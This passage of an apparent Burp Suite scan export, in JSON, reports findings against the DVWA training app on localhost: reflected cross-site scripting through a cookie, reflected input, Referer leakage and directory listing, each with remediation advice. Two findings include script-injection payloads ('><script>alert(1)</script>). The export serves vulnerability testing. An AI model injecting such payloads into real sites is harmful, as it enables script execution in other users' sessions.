        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>ikjbs'&gt;&lt;script&gt;alert(1)&lt;/script&gt;u3bux</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "106": {
        "\ufeffissue__serialNumber": "3.00613E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_d/",
        "issue__location": "/dvwa/vulnerabilities/xss_d/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "107": {
        "\ufeffissue__serialNumber": "1.7036E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/javascript/",
        "issue__location": "/dvwa/vulnerabilities/javascript/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>qhf2i'&gt;&lt;script&gt;alert(1)&lt;/script&gt;pjg3u</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "108": {
        "\ufeffissue__serialNumber": "4.44169E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/javascript/",
        "issue__location": "/dvwa/vulnerabilities/javascript/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "109": {
        "\ufeffissue__serialNumber": "5.56272E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/ [page parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>page</b> request parameter is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "110": {
        "\ufeffissue__serialNumber": "7.47382E+18",
        "issue__type": "5243904",
        "issue__name": "Cross-domain Referer leakage",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/security.php",
        "issue__location": "/dvwa/security.php",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the \"Referer\" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>\\n<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>\\n<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>\\n<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>\\n<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>",
        "issue__remediationBackground": "<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.\\n</p>",
        "issue__references": "<ul>\\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\">Referer Policy</a></li>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure\">Web Security Academy: Information disclosure</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/200.html\">CWE-200: Information Exposure</a></li>\\n</ul>",
        "issue__issueDetail": "The page was loaded from a URL containing a query string:<ul><li>https://localhost:8888/dvwa/security.php</li></ul>The response contains the following link to another domain:<ul><li>https://github.com/PHPIDS/PHPIDS</li></ul>",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "https://github.com/PHPIDS/PHPIDS",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "111": {
        "\ufeffissue__serialNumber": "5.32441E+18",
        "issue__type": "6291712",
        "issue__name": "Directory listing",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/hackable/",
        "issue__location": "/dvwa/hackable/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Web servers can be configured to automatically list the contents of directories that do not have an index page present. This can aid an attacker by enabling them to quickly identify the resources at a given path, and proceed directly to analyzing and attacking those resources. It particularly increases the exposure of sensitive files within the directory that are not intended to be accessible to users, such as temporary files and crash dumps.</p>\\n<p>Directory listings themselves do not necessarily constitute a security vulnerability. Any sensitive resources within the web root should in any case be properly access-controlled, and should not be accessible by an unauthorized party who happens to know or guess the URL. Even when directory listings are disabled, an attacker may guess the location of sensitive files using automated tools.</p>",
        "issue__remediationBackground": "<p>There is not usually any good reason to provide directory listings, and disabling them may place additional hurdles in the path of an attacker. This can normally be achieved in two ways:</p>\\n<ul>\\n<li>Configure your web server to prevent directory listings for all paths beneath the web root; </li>\\n<li>Place into each directory a default file (such as index.htm) that the web server will display instead of returning a directory listing.</li></ul>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure/exploiting#directory-listings\">Web Security Academy: Information disclosure via directory listings</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/538.html\">CWE-538: File and Directory Information Exposure</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/548.html\">CWE-548: Information Exposure Through Directory Listing</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/37.html\">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
